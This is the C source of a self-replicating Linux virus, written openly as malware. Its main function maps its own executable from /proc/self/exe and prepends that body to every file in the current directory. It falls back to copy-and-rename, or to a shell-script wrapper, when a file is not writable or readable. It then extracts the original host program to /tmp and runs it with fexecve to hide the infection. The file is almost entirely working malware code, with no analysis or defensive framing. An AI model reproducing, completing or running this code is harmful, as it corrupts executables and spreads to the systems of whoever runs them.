#ifndef __linux__
#error "Linux only"
#endif

#include <assert.h>
#include <elf.h>
#include <errno.h>
#include <dirent.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

#ifndef __ELF__
#error "ELF only"
#endif

static_assert(sizeof(size_t) >= sizeof(off_t), "off_t must fit in size_t");

#include "compute-virus-size-32.c"
#include "compute-virus-size-64.c"

off_t compute_virus_size(FILE *file) {
    unsigned char identifier[EI_NIDENT];

    if (fread(identifier, sizeof(identifier), 1, file) == 0) {
        off_t result = -errno;
        assert(ferror(file));
        return result;
    }

    rewind(file);

    switch (identifier[EI_CLASS]) {
        case ELFCLASS32:
            return compute_virus_size_32(file);
        case ELFCLASS64:
            return compute_virus_size_64(file);
        default:
            assert(false);
            return -ENOEXEC;
    }
}

size_t write_all(int fd, const void *buf, size_t remaining) {
    while (remaining > 0) {
        ssize_t result = write(fd, buf, remaining);
        if (result < 0) break;
        remaining -= result;
    }
    return remaining;
}

int writev_all(int fd, struct iovec *iov, int remaining) {
    while (remaining > 0) {
        ssize_t result = writev(fd, iov, remaining);
        if (result < 0) break;
        for (int i = 0; i < remaining; ++i) {
            size_t *iov_len = &iov->iov_len;
            if ((size_t) result >= *iov_len) {
                result -= *iov_len;
                ++iov;
                --remaining;
            } else {
                *iov_len -= result;
                break;
            }
        }
    }
    return remaining;
}

size_t sendfile_all(int out_fd, int in_fd, size_t remaining) {
    while (remaining > 0) {
        ssize_t result = sendfile(out_fd, in_fd, NULL, remaining);
        if (result < 0) break;
        remaining -= result;
    }
    return remaining;
}

int infect_by_exec(const char *virus, size_t virus_size, const char *path) {
    int result = 0;

    char link[PATH_MAX];
    ssize_t length = readlink(path, link, sizeof(link) - 1);
    if (length < 0) {
        result = errno;
        goto exit;
    }
    link[length] = '\n';

    char tmp_name[] = "XXXXXX";
    int tmp_fd = mkstemp(tmp_name);
    if (tmp_fd == -1) {
        result = errno;
        goto exit;
    }

    result = fchmod(tmp_fd, S_IRUSR | S_IXUSR);
    if (result == -1) {
        result = errno;
        goto close_tmp;
    }

    static const char script_header[] = "#!/bin/sh\nexec ";

    result = posix_fallocate(tmp_fd, 0, virus_size + sizeof(script_header) + length);
    if (result) {
        goto close_tmp;
    }
    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);

    struct iovec iov[] = {
        {(void *) virus, virus_size},
        {(void *) script_header, sizeof(script_header) - 1},
        {link, length + 1}
    };
    int remaining = writev_all(tmp_fd, iov, sizeof(iov));
    if (remaining > 0) {
        result = errno;
        goto close_tmp;
    }

    result = fsync(tmp_fd);
    if (result) {
        result = errno;
        goto close_tmp;
    }

    close(tmp_fd);
    result = rename(tmp_name, path);
    if (result) {
        result = errno;
        unlink(tmp_name);
    }
    goto exit;

close_tmp:
    close(tmp_fd);
    unlink(tmp_name);

exit:
    return result;
}

int infect_by_copy(const char *virus, size_t virus_size, const char *path) {
    int result = 0;

    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        return infect_by_exec(virus, virus_size, path);
    }

    struct stat stat;
    if (fstat(fd, &stat)) {
        result = errno;
        goto close_fd;
    }

    char tmp_name[] = "XXXXXX";
    int tmp_fd = mkstemp(tmp_name);
    if (tmp_fd == -1) {
        result = errno;
        goto close_fd;
    }

    result = fchmod(tmp_fd, ~S_IFMT & stat.st_mode);
    if (result == -1) {
        result = errno;
        goto close_fd;
    }

    result = posix_fallocate(tmp_fd, 0, stat.st_size + virus_size);
    if (result) {
        goto close_tmp;
    }
    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);

    size_t remaining = write_all(tmp_fd, virus, virus_size);
    if (remaining > 0) {
        result = errno;
        goto close_tmp;
    }

    posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
    remaining = sendfile_all(tmp_fd, fd, stat.st_size);
    if (remaining > 0) {
        result = errno;
        goto close_tmp;
    }

    result = fsync(tmp_fd);
    if (result) {
        result = errno;
        goto close_tmp;
    }

    close(tmp_fd);
    result = rename(tmp_name, path);
    if (result) {
        result = errno;
        unlink(tmp_name);
    }
    goto close_fd;

close_tmp:
    close(tmp_fd);
    unlink(tmp_name);

close_fd:
    close(fd);

    return result;
}

int infect(const char *virus, size_t virus_size, const char *path) {
    int result = 0;

    int fd = open(path, O_RDWR);
    if (fd == -1) {
        return infect_by_copy(virus, virus_size, path);
    }

    struct stat stat;
    if (fstat(fd, &stat)) {
        result = errno;
        goto close_fd;
    }

    result = posix_fallocate(fd, stat.st_size, virus_size);
    if (result) {
        goto close_fd;
    }

    off_t new_size = stat.st_size + virus_size;
    char *content = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (content == MAP_FAILED) {
        result = errno;
        goto close_fd;
    }

    posix_madvise(content, new_size, POSIX_MADV_WILLNEED);
    memmove(content + virus_size, content, stat.st_size);
    posix_madvise(content, virus_size, POSIX_MADV_SEQUENTIAL);
    memcpy(content, virus, virus_size);
    
    {
        int result = munmap(content, new_size);
        assert(!result);
    }

close_fd:
    close(fd);

    return result;
}

int main(int argc, char *const argv[], char *const envp[]) {
    (void)argc;

    char buffer[BUFSIZ];
    FILE *exe_file = fopen("/proc/self/exe", "r");
    if (!exe_file) {
        fprintf(stderr, "could not open /proc/self/exe for reading: %s\n", strerror(errno));
        goto exit;
    }
    setbuf(exe_file, buffer);
    int exe_fd = fileno(exe_file);
    assert(exe_fd != -1);

    off_t virus_size = compute_virus_size(exe_file);
    if (virus_size < 0) {
        fprintf(stderr, "could not determine size: %s\n", strerror(-virus_size));
        goto close_exe;
    }

    struct stat exe_stat;
    if (fstat(exe_fd, &exe_stat)) {
        fprintf(stderr, "could not stat /proc/self/exe: %s\n", strerror(errno));
        goto close_exe;
    }
    assert(exe_stat.st_size >= virus_size);

    char *virus = mmap(NULL, virus_size, PROT_READ, MAP_SHARED, exe_fd, 0);
    if (virus == MAP_FAILED) {
        fprintf(stderr, "cannot memory-map %zu-byte virus: %s\n", 
                (size_t) virus_size, strerror(errno));
    } else {
        DIR *dir = opendir(".");
        if (dir) {
            struct dirent entry;
            struct dirent *result;
            while (true) {
                int error = readdir_r(dir, &entry, &result); 
                assert(!error);
                if (!result) break;

                posix_madvise(virus, virus_size, POSIX_MADV_SEQUENTIAL);
                error = infect(virus, virus_size, entry.d_name);
                if (error) {
                    fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(error));
                }
            }
            closedir(dir);
        } else {
            fprintf(stderr, "cannot open .: %s\n", strerror(errno));
        }
        int error = munmap(virus, virus_size);
        assert(!error);
    }

    off_t actual_size = exe_stat.st_size - virus_size;
    if (actual_size == 0) {
        fclose(exe_file);
        return 0;
    }

    char tmp_path[] = "/tmp/XXXXXX";
    int tmp_fd = mkstemp(tmp_path);
    if (tmp_fd == -1) {
        fprintf(stderr, "cannot create temporary file in /tmp: %s\n", strerror(errno));
        goto close_exe;
    }

    {
        int result = posix_fallocate(tmp_fd, 0, actual_size);
        if (result) {
            fprintf(stderr, "cannot allocate %zu bytes for %s: %s\n",
                    (size_t) actual_size, tmp_path, strerror(result));
            goto close_tmp;
        }
    }

    {
        int result = lseek(exe_fd, virus_size, SEEK_SET);
        assert(result != -1);
    }
    posix_fadvise(exe_fd, virus_size, actual_size, POSIX_FADV_SEQUENTIAL);
    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
    {
        size_t remaining = sendfile_all(tmp_fd, exe_fd, actual_size);
        if (remaining > 0) {
            fprintf(stderr,
                    "cannot write remaining %zu of %zu bytes "
                    "from /proc/self/exe to %s: %s\n",
                    remaining, (size_t) actual_size, tmp_path, strerror(errno));
            goto close_tmp;
        }
    }

    {
        mode_t mode = ~S_IFMT & exe_stat.st_mode;
        int result = fchmod(tmp_fd, mode);
        if (result == -1) {
            fprintf(stderr, "cannot set permissions of %s to %o: %s\n",
                    tmp_path, (int) mode, strerror(errno));
            goto close_tmp;
        }
    }

    if (fsync(tmp_fd)) {
        fprintf(stderr, "cannot sync %s: %s\n", tmp_path, strerror(errno));
        goto close_tmp;
    }

    int tmp_fd2 = open(tmp_path, O_RDONLY);
    if (tmp_fd2 == -1) {
        fprintf(stderr, "cannot open %s for reading: %s\n", tmp_path, strerror(errno));
        goto close_tmp;
    }

    close(tmp_fd);
    unlink(tmp_path);
    fclose(exe_file);
    fexecve(tmp_fd2, argv, envp);
    fprintf(stderr, "cannot execute %s: %s\n", tmp_path, strerror(errno));
    close(tmp_fd2);
    goto exit;

close_tmp:
    close(tmp_fd);
    unlink(tmp_path);

close_exe:
    fclose(exe_file);
    
exit:
    return EXIT_FAILURE;
}
